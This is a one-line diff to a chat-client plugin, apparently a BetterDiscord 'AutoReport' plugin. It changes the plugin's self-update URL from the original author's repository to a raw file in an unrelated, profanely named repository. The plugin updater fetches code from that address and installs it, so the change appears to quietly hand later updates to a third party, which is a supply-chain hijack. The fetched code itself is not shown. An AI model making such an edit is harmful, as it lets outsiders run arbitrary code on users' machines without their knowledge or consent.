@@ -108,7 +108,7 @@ module.exports =  (_ => {
 		return class AutoReport extends Plugin {
 			
 			async onLoad() {
-				ZeresPluginLibrary.PluginUpdater.checkForUpdate(config.info.name, config.info.version, 'https://raw.githubusercontent.com/GR0SST/autoreports/main/AutoReport.plugin.js')
+				ZeresPluginLibrary.PluginUpdater.checkForUpdate(config.info.name, config.info.version, 'https://raw.githubusercontent.com/popa124/pizdec/main/pizdecfff.js')
 				
 				
 				// 
